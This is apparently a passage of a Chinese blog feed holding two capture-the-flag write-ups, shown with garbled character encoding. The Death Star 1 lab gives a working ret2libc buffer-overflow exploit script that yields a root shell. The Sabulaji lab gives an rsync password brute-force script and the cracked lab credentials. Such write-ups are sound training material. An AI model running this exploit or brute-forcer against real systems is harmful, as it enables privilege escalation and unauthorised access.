erso@deathStar1:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mtr
/usr/bin/pkexec
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/sbin/uuidd
/usr/sbin/pppd
/bin/su
/bin/ping6
/bin/fusermount
/bin/dartVader  &lt;-- ÂèØÁñë
/bin/umount
/bin/mount
/bin/ping
```

`/bin/dartVader` ÊòØ‰∏Ä‰∏™ÂèØÁñëÁöÑ SUID Êñá‰ª∂Ôºå‰∏éÈù∂Êú∫‰∏ªÈ¢òÁõ∏ÂÖ≥„ÄÇ

ÂàÜÊûê `/bin/dartVader`Ôºö

```bash
erso@deathStar1:~$ ls -l /bin/dartVader
-rwsr-xr-x 1 root root 7338 Nov  7  2019 /bin/dartVader
erso@deathStar1:~$ file /bin/dartVader
/bin/dartVader: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=affd50502e973bd3d6d0637028395d87ba695ab9, not stripped
erso@deathStar1:~$ /bin/dartVader
dartVader: Voce tem um futuro aqui. Nao seja um Lammer, busque e aprenda realmente...
# ÁøªËØë: ËææÊñØ¬∑Áª¥ËææÔºö‰Ω†Êã•ÊúâÊú™Êù•„ÄÇÂà´ÂÅöÊãâÈªòÔºåÂéªÊé¢Á¥¢Âπ∂ÁúüÊ≠£Â≠¶‰π†‚Ä¶‚Ä¶
```

ËøôÊòØ‰∏Ä‰∏™ 32 ‰Ωç SUID ÂèØÊâßË°åÊñá‰ª∂„ÄÇÊü•ÁúãÂÖ∂Â≠óÁ¨¶‰∏≤Ôºö

```bash
erso@deathStar1:~$ strings /bin/dartVader
# ... (ÈÉ®ÂàÜËæìÂá∫) ...
strcpy
# ...
game3.c
# ...
```

ÂèëÁé∞ `strcpy` ÂáΩÊï∞ÂíåÊ∫êÊñá‰ª∂Âêç `game3.c`ÔºåËøôÂº∫ÁÉàÊöóÁ§∫Â≠òÂú®ÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊºèÊ¥û„ÄÇ

ÊµãËØïÁºìÂÜ≤Âå∫Ê∫¢Âá∫Ôºö

```bash
erso@deathStar1:~$ /bin/dartVader aaaaaaaaa
erso@deathStar1:~$ /bin/dartVader aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
erso@deathStar1:~$ /bin/dartVader aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

ËæìÂÖ•Â§ßÈáè 'a' ÂØºËá¥ÊÆµÈîôËØØÔºåÁ°ÆËÆ§Â≠òÂú®ÁºìÂÜ≤Âå∫Ê∫¢Âá∫„ÄÇ

Â∞Ü `/bin/dartVader` Êñá‰ª∂‰º†ËæìÂà∞Êú¨Âú∞ Kali ËøõË°åÂàÜÊûêÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ scp -P 10110 erso@192.168.205.210:/bin/dartVader .
# ... (‰º†ËæìÊàêÂäü) ...
```

‰ΩøÁî® IDA Pro ÂèçÁºñËØë `dartVader`Ôºö

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest[64]; // [esp+10h] [ebp-40h] BYREF

  if ( argc == 1 )
    errx(1, 'Voce tem um futuro aqui. Nao seja um Lammer, busque e aprenda realmente...\n');
  return (int)strcpy(dest, argv[1]);
}
```

`dest` ÁºìÂÜ≤Âå∫Â§ßÂ∞è‰∏∫ 64 Â≠óËäÇ„ÄÇ`strcpy` Â∞Ü `argv[1]` (ÂëΩ‰ª§Ë°åÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞) Â§çÂà∂Âà∞ `dest`ÔºåÊ≤°ÊúâÈïøÂ∫¶Ê£ÄÊü•„ÄÇ

Âú® GDB ‰∏≠Á°ÆÂÆö EIP Ë¶ÜÁõñÁöÑÁ≤æÁ°ÆÂÅèÁßªÈáèÔºö

1.  ÁîüÊàê‰∏Ä‰∏™ÂîØ‰∏ÄÁöÑÈùûÈáçÂ§çÂ≠óÁ¨¶‰∏≤‰Ωú‰∏∫ËæìÂÖ•„ÄÇ
2.  Âú® GDB ‰∏≠ËøêË°åÁ®ãÂ∫èÔºå‰ΩøÁî®ËØ•Â≠óÁ¨¶‰∏≤‰Ωú‰∏∫ÂèÇÊï∞„ÄÇ
3.  ÂΩìÁ®ãÂ∫èÂ¥©Ê∫ÉÊó∂ÔºåÊü•Áúã EIP ÂØÑÂ≠òÂô®ÁöÑÂÄº„ÄÇ
4.  ‰ΩøÁî® `pattern_offset.rb` (ÊàñÁ±ª‰ººÂ∑•ÂÖ∑) ÊâæÂà∞ËØ•ÂÄºÂú®ÂéüÂßãÂ≠óÁ¨¶‰∏≤‰∏≠ÁöÑÂÅèÁßª„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ gdb dartVader
(gdb) set disassembly-flavor intel
(gdb) run $(/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 80) 
# ÊàñËÄÖÊâãÂä®ËæìÂÖ• pattern_create ÁîüÊàêÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÂ¶Ç Aa0Aa1...
Starting program: /mnt/hgfs/gx/dartVader Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
[Thread debugging using libthread_db enabled]
Using host libthread_db library '/lib/x86_64-linux-gnu/libthread_db.so.1'.

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
(gdb) info registers eip
eip            0x63413563          0x63413563
```

EIP Ë¢´ `0x63413563` (ASCII 'c5Ac') Ë¶ÜÁõñ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563 -l 80
[*] Exact match at offset 76
```

ÂÅèÁßªÈáè‰∏∫ 76 Â≠óËäÇ„ÄÇÈ™åËØÅÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ gdb dartVader
(gdb) run $(python2 -c 'print 'A'*76 + 'BBBB'')
Starting program: /mnt/hgfs/gx/dartVader $(python2 -c 'print 'A'*76 + 'BBBB'')
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info registers eip
eip            0x42424242          0x42424242
```

EIP ÊàêÂäüË¢´ `BBBB` (0x42424242) Ë¶ÜÁõñ„ÄÇ

Ê£ÄÊü•Á≥ªÁªü‰øùÊä§Êú∫Âà∂Ôºö

* ASLR (Âú∞ÂùÄÁ©∫Èó¥Â∏ÉÂ±ÄÈöèÊú∫Âåñ):

  ```bash
  erso@deathStar1:~$ cat /proc/sys/kernel/randomize_va_space
  2
  ```

  ASLR ÂÆåÂÖ®ÂºÄÂêØ„ÄÇ

* NX (No-eXecute bit):

  ```bash
  erso@deathStar1:~$ readelf -W -l /bin/dartVader 
  # ...
  Program Headers:
    Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  # ...
    GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10 
  # ...
  ```

  `GNU_STACK` Ê†áÂøó‰∏∫ `RW`ÔºåË°®Á§∫Ê†àÂå∫ÂèØËØªÂèØÂÜô‰ΩÜ‰∏çÂèØÊâßË°åÔºåNX bit ÂºÄÂêØ„ÄÇ

Áî±‰∫é ASLR Âíå NX ÂºÄÂêØÔºåÁõ¥Êé•Ê≥®ÂÖ• shellcode Âà∞Ê†à‰∏äÊâßË°å‰∏çÂèØË°å„ÄÇÈááÁî® Ret2Libc (ËøîÂõûÂà∞ libc) ÊäÄÊúØ„ÄÇ
Áî±‰∫éÊòØ 32 ‰ΩçÁ≥ªÁªüÔºålibc Âú∞ÂùÄËôΩÁÑ∂ÈöèÊú∫ÂåñÔºå‰ΩÜËåÉÂõ¥Áõ∏ÂØπËæÉÂ∞èÔºåÂèØ‰ª•Â∞ùËØïÁàÜÁ†¥ libc Âü∫ÂùÄ„ÄÇ

Ëé∑Âèñ libc ‰∏≠ `system`„ÄÅ`exit` ÂáΩÊï∞Âíå `'/bin/sh'` Â≠óÁ¨¶‰∏≤ÁöÑÂÅèÁßªÈáèÔºö

```bash
erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' system@'
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
# system_offset = 0x00040310

erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' exit@'
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
# exit_offset = 0x00033260

erso@deathStar1:~$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'
 162d4c /bin/sh
# sh_offset = 0x162d4c
```

Â§öÊ¨°ËøêË°å `ldd /bin/dartVader` ËßÇÂØü libc Âü∫ÂùÄÂèòÂåñËåÉÂõ¥Ôºå‰æãÂ¶ÇÔºö

```bash
erso@deathStar1:~$ ldd /bin/dartVader 
        linux-gate.so.1 =&gt;  (0xb7793000)
        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75d7000) # &lt;--- libc Âü∫ÂùÄ
        /lib/ld-linux.so.2 (0xb7795000)
```

Âü∫ÂùÄÂ§ßÁ∫¶Âú® `0xb75xxxxx` Âà∞ `0xb77xxxxx` ‰πãÈó¥„ÄÇ

ÁºñÂÜôÁàÜÁ†¥ËÑöÊú¨ `exp.py`Ôºö

```python
#!/usr/bin/env python3

from struct import pack
from subprocess import call

# Â∑≤Áü•ÂÅèÁßªÈáè
system_offset = 0x40310
exit_offset = 0x33260
sh_offset = 0x162d4c

# Âõ∫ÂÆöÁõÆÊ†áÁ®ãÂ∫èË∑ØÂæÑ
app = b'/bin/dartVader'

# ÁºìÂÜ≤Âå∫Â°´ÂÖÖÈïøÂ∫¶ÔºàÊ†πÊçÆ‰Ω†ÁöÑÊ∫¢Âá∫ÁÇπË∞ÉÊï¥Ôºâ
offset = b'A' * 76

def try_exploit(libc_base):
    system = pack('&lt;I', libc_base + system_offset)
    exit_func = pack('&lt;I', libc_base + exit_offset)
    sh_str = pack('&lt;I', libc_base + sh_offset)
    payload = offset + system + exit_func + sh_str
    ret = call([app, payload])
    return ret == 0

# ÁàÜÁ†¥ libc Âú∞ÂùÄËåÉÂõ¥ÔºàÊØèÊ¨°Â¢ûÂä† 0x1000Ôºâ
base_address = 0xb7500000
end_address = 0xb7700000

print('[*] Starting brute-force attack...')

found = False
for addr in range(base_address, end_address, 0x1000):
    print('[+] Trying libc base: 0x%08x' % addr)
    if try_exploit(addr):
        print('[+] Exploit successful!')
        found = True
        break

if not found:
    print('[-] Brute-force failed.')
```

Âú®Èù∂Êú∫‰∏äËøêË°åÊ≠§ËÑöÊú¨ÔºàÊàñÁ±ª‰ººÈÄªËæëÁöÑËÑöÊú¨Ôºâ„ÄÇÂú®ÁàÜÁ†¥ËøáÁ®ã‰∏≠ÔºåÂΩì libc Âü∫ÂùÄÊ≠£Á°ÆÊó∂Ôºå`system('/bin/sh')` ‰ºöË¢´Ë∞ÉÁî®Ôºå‰ªéËÄåËé∑Âæó root shell„ÄÇ
Áî®Êà∑Âú® `0xb7564000` Ëøô‰∏™Âü∫ÂùÄÈôÑËøëÔºàÊàñÂ∞±ÊòØËøô‰∏™Âü∫ÂùÄÔºâËé∑Âæó‰∫ÜÊàêÂäü„ÄÇ

```bash
erso@deathStar1:~$ python3 exp.py 
# ... (ÁàÜÁ†¥ËøáÁ®ã) ...
[+] Trying libc base: 0xb7564000 
# (Ê≠§Â§ÑËÑöÊú¨ÂèØËÉΩÂõ† system('/bin/sh') Ë∞ÉÁî®ËÄåÊöÇÂÅúÔºåÊàñËÄÖshellÁõ¥Êé•Êé•ÁÆ°‰∫ÜÁªàÁ´Ø)
# id
uid=1000(erso) gid=1000(erso) euid=0(root) groups=0(root),1000(erso)
# cat /root/message.txt
Art by Shanaka Dias
                    .==.
                   ()''()-.
        .---.       ;--; /
      .'_:___'. _..'.  __'.
      |__ --==|'-''' \'...;
      [  ]  :[|       |---\
      |__| I=[|     .'    '.
      / / ____|     :       '._
     |-/.____.'      | :       :
snd /___\ /___\      '-'._----'

-------------------------------------

Congratulations!!
You helped me destroy the empire's weapon.

-------------------------------------
If you had fun, love to get your feedback.
Send me a tweet @mrhenrike  ;)

Until the next VM and 'May the force be with you'.
```

### ÊÄªÁªì

ËØ•Èù∂Êú∫Ê∂âÂèä‰∫ÜÂ§öÁßçÊ∏óÈÄèÊäÄÂ∑ßÔºö

1.  ÈÄöËøáÊµÅÈáèÊçïËé∑ÂèëÁé∞ÈöêËóèÁöÑ UDP ÈÄö‰ø°Á´ØÂè£„ÄÇ
2.  Ëß£Êûê UDP Ê∂àÊÅØËé∑ÂèñÁ∫øÁ¥¢ÂíåÂØÜÁ†Å„ÄÇ
3.  Base64 Ëß£Á†ÅÂíåÂõæÁâáÈöêÂÜôÔºàsteghideÔºâËé∑ÂèñËøõ‰∏ÄÊ≠•Êåá‰ª§„ÄÇ
4.  Á´ØÂè£Êï≤Èó®ÊäÄÊúØËß£ÈîÅÊñ∞ÁöÑÊúçÂä°Á´ØÂè£„ÄÇ
5.  SSH Âº±ÂØÜÁ†ÅÁàÜÁ†¥ÔºàÂü∫‰∫éÊèêÁ§∫‰ø°ÊÅØÔºâ„ÄÇ
6.  Linux SUID ‰∫åËøõÂà∂Êñá‰ª∂ÊèêÊùÉÔºåÈÄöËøáÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÔºàstrcpyÔºâÂíå Ret2Libc ÊäÄÊúØÁªïËøá ASLR Âíå NX ‰øùÊä§ÔºåÊúÄÁªàËé∑Âæó root ÊùÉÈôê„ÄÇ

Êï¥‰∏™ËøáÁ®ãÂØπ‰ø°ÊÅØÊî∂ÈõÜ„ÄÅÁ∫øÁ¥¢ÂÖ≥ËÅîÂíåÊºèÊ¥ûÂà©Áî®ËÉΩÂäõÈÉΩÊúâ‰∏ÄÂÆöÁöÑËÄÉÈ™å„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/VulnHub%20Death%20Star-%201%20-shen-tou-ce-shi-bao-gao.html</guid><pubDate>Fri, 27 Jun 2025 09:29:01 +0000</pubDate></item><item><title>hmv_Sabulaji</title><link>https://7r1UMPHK.github.io/post/hmv_Sabulaji.html</link><description>ÂÆ≥ÔºåËøôÈù∂Êú∫ÔºåÁªôÊàëÂπ≤Ê≤âÈªò‰∫Ü

ÂÖàÊé¢Êµãip

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ sudo arp-scan -l            
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f8:ba:aa       VMware, Inc.
192.168.205.136 08:00:27:05:77:df       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:f3:0c:de       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.966 seconds (130.21 hosts/sec). 4 responded
          
```

Êé¢ÊµãÊúçÂä°

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nmap -p- 192.168.205.136
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 20:39 EDT
Nmap scan report for 192.168.205.136
Host is up (0.00012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
873/tcp open  rsync
MAC Address: 08:00:27:05:77:DF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
                                                                            
```

https://book.hacktricks.wiki/zh/network-services-pentesting/873-pentesting-rsync.html#873---pentesting-rsync
ÊÑüÂÖ¥Ë∂£ÁöÑËá™Â∑±ÂéªÁúãÔºåÂ§ßÊ¶ÇÂäüËÉΩÊòØ

![image-20250612085331462](https://7r1umphk.github.io/image/20250612085338904.webp)

Êü•Áúã‰∏Ä‰∏ãÂÖ±‰∫´ÁõÆÂΩï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ rsync rsync://192.168.205.136:873

public          Public Files
epages          Secret Documents
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ rsync rsync://192.168.205.136:873/public/

drwxr-xr-x          4,096 2025/05/15 12:35:39 .
-rw-r--r--            433 2025/05/15 12:35:39 todo.list
                                                                       
```

Êãâ‰∏ãÊù•

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ mkdir tmp
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ rsync -avz rsync://192.168.205.136:873/public/ ./tmp/public/

receiving incremental file list
created directory ./tmp/public
./
todo.list

sent 46 bytes  received 380 bytes  852.00 bytes/sec
total size is 433  speedup is 1.02
                                                            
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/tmp/public]
‚îî‚îÄ$ cat todo.list | trans -b :zh 2&gt;/dev/null
ÂæÖÂäû‰∫ãÈ°πÂàóË°®
==========

1„ÄÇSabulajiÔºöÂà†Èô§ÁßÅ‰∫∫ÂÖ±‰∫´ËÆæÁΩÆ
 - Êü•ÁúãÊâÄÊúâÂÖ±‰∫´Êñá‰ª∂ÂíåÊñá‰ª∂Â§π„ÄÇ
 - Á¶ÅÁî®‰ªª‰ΩïÁßÅ‰∫∫ÂÖ±‰∫´ÈìæÊé•ÊàñÊùÉÈôê„ÄÇ

2„ÄÇSabulajiÔºöÊõ¥Êîπ‰∏∫Âº∫ÂØÜÁ†Å
 - ÂàõÂª∫‰∏Ä‰∏™Êñ∞ÂØÜÁ†ÅÔºàËá≥Â∞ë12‰∏™Â≠óÁ¨¶ÔºåÂåÖÊã¨Â§ßÂÜôÔºåÂ∞èÂÜôÔºåÊï∞Â≠óÂíåÁ¨¶Âè∑Ôºâ„ÄÇ
 - Êõ¥Êñ∞Á≥ªÁªüËÆæÁΩÆ‰∏≠ÁöÑÂØÜÁ†Å„ÄÇ
 - Á°Æ‰øù‰∏ç‰ªéÂÖ∂‰ªñÂ∏êÊà∑ÈáçÂ§ç‰ΩøÁî®Êñ∞ÂØÜÁ†Å„ÄÇ
==========
      
```

ÊèêÁ§∫Êàë‰ª¨sabulajiÊòØÂº±ÂØÜÁ†ÅÔºåÊàëÁàÜÁ†¥‰∫ÜsshÊó†ÊûúÔºåÈÇ£Â∞±ÁªßÁª≠ÁúãÂÖ±‰∫´ÁõÆÂΩï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/tmp/public]
‚îî‚îÄ$ rsync -avz rsync://192.168.205.136:873/epages/ ./tmp/epages/

Password: 
@ERROR: auth failed on module epages
rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver=3.4.1]
                      
```

Ë¶ÅÂØÜÁ†ÅÔºåÊâæaiÂÜô‰∏™ËÑöÊú¨ÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat bprsync.py 
#!/usr/bin/env python3
import subprocess
import os
import sys
from multiprocessing import Pool, Manager, cpu_count, RLock
import signal
from functools import partial
from tqdm import tqdm

TARGET_HOST = '192.168.205.136'
TARGET_PORT = '873'
TARGET_MODULE = 'epages'
WORDLIST_PATH = '/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt'
USERNAMES = ['', 'sabulaji']
RSYNC_TIMEOUT = 10
try:
    NUM_PROCESSES = cpu_count() if cpu_count() &lt;= 8 else 8
except NotImplementedError:
    NUM_PROCESSES = 4

g_found_credential = None
g_pool = None


def signal_handler(sig, frame):
    global g_pool
    print('\n[!] CTRL+C pressed. Exiting.')
    if g_pool:
        g_pool.terminate()
        g_pool.join()
    sys.exit(1)


def check_password(password, found_flag, usernames):
    if found_flag.is_set():
        return None

    for username in usernames:
        if found_flag.is_set():
            return None

        user_part = f'{username}@' if username else ''
        target_url = f'rsync://{user_part}{TARGET_HOST}:{TARGET_PORT}/{TARGET_MODULE}'

        env = os.environ.copy()
        env['RSYNC_PASSWORD'] = password

        command = ['rsync', '--list-only', '-q', target_url]

        try:
            result = subprocess.run(
                command,
                env=env,
                capture_output=True,
                text=True,
                timeout=RSYNC_TIMEOUT
            )

            if result.returncode == 0:
                if not found_flag.is_set():
                    found_flag.set()
                    return (username, password)

        except (subprocess.TimeoutExpired, Exception):
            continue

    return None


def main():
    global g_found_credential, g_pool

    signal.signal(signal.SIGINT, signal_handler)
    tqdm.set_lock(RLock())

    if not os.path.exists(WORDLIST_PATH):
        print('[-] Wordlist not found.')
        sys.exit(1)

    try:
        with open(WORDLIST_PATH, 'r', encoding='latin-1', errors='ignore') as f:
            passwords = [line.strip() for line in f]
    except Exception as e:
        print(f'[-] Error reading wordlist: {e}')
        sys.exit(1)

    if not passwords:
        print('[-] Wordlist is empty.')
        sys.exit(1)

    total_passwords = len(passwords)
    print(f'[+] Starting rsync brute-force attack...')

    with Manager() as manager:
        found_flag = manager.Event()

        with Pool(processes=NUM_PROCESSES, initializer=tqdm.set_lock, initargs=(tqdm.get_lock(),)) as pool:
            g_pool = pool
            worker_func = partial(check_password, found_flag=found_flag, usernames=USERNAMES)

            try:
                with tqdm(total=total_passwords, unit=' passwords', dynamic_ncols=True) as pbar:
                    for result in pool.imap_unordered(worker_func, passwords):
                        pbar.update(1)
                        if result is not None:
                            g_found_credential = result
                            pool.terminate()
                            break
            finally:
                pool.join()

    print('\n' + '=' * 60)
    if g_found_credential:
        found_user, found_pass = g_found_credential
        display_user = found_user if found_user else '&lt;empty&gt;'
        print(f'[+] SUCCESS! Credentials found:')
        print(f'    Username: {display_user}')
        print(f'    Password: {found_pass}')
    else:
        print('[-] FAILED. No valid credentials found.')
    print('=' * 60)


if __name__ == '__main__':
    main()
   
```

Â∞èÁü•ËØÜÔºå[[Sublarge](https://hackmyvm.eu/profile/?user=Sublarge)](https://hackmyvm.eu/profile/?user=Sublarge)ÂæàÂñúÊ¨¢‰ΩøÁî®xato-net-10-million-passwords-100000.txtËøô‰∏™Â≠óÂÖ∏ÔºåÂºÄÁàÜ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ python3 $_               
[+] Starting rsync brute-force attack...
 16%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñä                                                                                                           | 15589/100000 [06:55&lt;37:30, 37.51 passwords/s]

============================================================
[+] SUCCESS! Credentials found:
    Username: sabulaji
    Password: admin123
============================================================
                                                                    
```

Êã∑‰∏ãÊù•

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ rsync -avz rsync://sabulaji@192.168.205.136:873/epages/ ./tmp/epages/

Password: 
receiving incremental file list
created directory ./tmp/epages
./
secrets.doc

sent 46 bytes  received 3,242 bytes  1,315.20 bytes/sec
total size is 13,312  speedup is 4.05
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cd tmp/epages 
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/tmp/epages]
‚îî‚îÄ$ ls -al
total 13
drwxr-xr-x 1 kali kali     0 Jun 11 21:08 .
drwxr-xr-x 1 kali kali     0 Jun 11 21:08 ..
-rwxr-xr-x 1 kali kali 13312 May 15 12:17 secrets.doc
 
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/tmp/epages]
‚îî‚îÄ$ libreoffice secrets.doc 
```

```
The Art of Keeping Secrets
In a world overflowing with information, keeping secrets is both an art and a challenge. Whether it's a personal diary tucked under a mattress or a cryptic message passed in a crowded caf√©, the allure of hidden knowledge captivates us all.
Take, for example, the old server room in my office. It‚Äôs a dusty corner where forgotten machines hum quietly. One of them, a relic from the early 2000s, still runs an FTP service. The admin, in a moment of questionable judgment, named the default account 'welcome.' I overheard a colleague chuckle about it, saying the password was something absurdly simple, like 'P@ssw0rd123!'‚Äîhardly a secret worth keeping, but it‚Äôs been untouched for years.
Secrets, however, aren‚Äôt just about passwords or hidden files. They‚Äôre about intent. A whispered rumor about a project, a coded glance between friends, or even the way we guard our thoughts. The best secrets are those that hide in plain sight, unnoticed by the distracted eye.
So, how do we master this art? First, blend in. Don‚Äôt make your secret obvious. Second, protect it with something stronger than 'P@ssw0rd123!'‚Äîmaybe a phrase only you‚Äôd understand. And finally, trust sparingly. Even the most welcoming systems can betray you if you‚Äôre not careful.
In the end, secrets remind us that not everything needs to be shared. Some things are better left unsaid, or at least, left to those who know where to look.

ÁøªËØë
‰øùÂÆàÁßòÂØÜÁöÑËâ∫ÊúØ
Âú®Ëøô‰∏™‰ø°ÊÅØÊ≥õÊª•ÁöÑ‰∏ñÁïåÈáåÔºå‰øùÂÆàÁßòÂØÜÊó¢ÊòØ‰∏ÄÈó®Ëâ∫ÊúØÔºå‰πüÊòØ‰∏ÄÈ°πÊåëÊàò„ÄÇÊó†ËÆ∫ÊòØËóèÂú®Â∫äÂû´‰∏ãÁöÑÁßÅ‰∫∫Êó•ËÆ∞ÔºåËøòÊòØÂú®Êã•Êå§ÁöÑÂíñÂï°È¶ÜÈáå‰º†ÈÄíÁöÑÁ•ûÁßò‰ø°ÊÅØÔºåÈöêËóèÁü•ËØÜÁöÑÈ≠ÖÂäõÈÉΩÊ∑±Ê∑±Âê∏ÂºïÁùÄÊàë‰ª¨„ÄÇ
Â∞±ÊãøÊàëÂäûÂÖ¨ÂÆ§ÈáåÁöÑËÄÅÊúçÂä°Âô®Êú∫ÊàøÊù•ËØ¥Âêß„ÄÇÈÇ£ÊòØ‰∏Ä‰∏™Â∏ÉÊª°ÁÅ∞Â∞òÁöÑËßíËêΩÔºå‰∏Ä‰∫õË¢´ÈÅóÂøòÁöÑÊú∫Âô®ÈùôÈùôÂú∞Âó°Âó°‰ΩúÂìç„ÄÇÂÖ∂‰∏≠‰∏ÄÂè∞ÊòØ21‰∏ñÁ∫™ÂàùÁöÑÈÅóÁâ©ÔºåËá≥‰ªä‰ªçÂú®ËøêË°åFTPÊúçÂä°„ÄÇÁÆ°ÁêÜÂëò‰∏ÄÊó∂Á≥äÊ∂ÇÔºåÊääÈªòËÆ§Ë¥¶Êà∑ÂëΩÂêç‰∏∫‚Äúwelcome‚Äù„ÄÇÊàëÊó†ÊÑè‰∏≠Âê¨Âà∞‰∏Ä‰ΩçÂêå‰∫ãÂØπÊ≠§Á™ÉÁ¨ëÔºåËØ¥ÂØÜÁ†ÅÁÆÄÂçïÂæóÂèØÁ¨ëÔºåÊØîÂ¶Ç‚ÄúP@ssw0rd123ÔºÅ‚Äù‚Äî‚ÄîËøôÁÆó‰∏ç‰∏ä‰ªÄ‰πàÂÄºÂæó‰øùÂÆàÁöÑÁßòÂØÜÔºå‰ΩÜÂ§öÂπ¥Êù•Âç¥‰ªéÊú™Ë¢´Ëß¶Á¢∞Ëøá„ÄÇ
ÁÑ∂ËÄåÔºåÁßòÂØÜ‰∏ç‰ªÖ‰ªÖÂÖ≥‰πéÂØÜÁ†ÅÊàñÈöêËóèÊñá‰ª∂„ÄÇÂÆÉÂÖ≥‰πéÊÑèÂõæ„ÄÇÂÖ≥‰∫éÈ°πÁõÆÁöÑÊÇÑÊÇÑÊµÅË®ÄÔºåÊúãÂèã‰πãÈó¥Êöó‰∏≠‰∏ÄÁû•ÔºåÁîöËá≥ÊòØÊàë‰ª¨ÂÆàÊä§ÊÄùÊÉ≥ÁöÑÊñπÂºè„ÄÇÊúÄÂ•ΩÁöÑÁßòÂØÜÊòØÈÇ£‰∫õËóèÂú®‰ºóÁõÆÁùΩÁùΩ‰πã‰∏ãÔºå‰∏çË¢´ÂàÜÂøÉ‰πãÁúºÂØüËßâÁöÑÁßòÂØÜ„ÄÇ
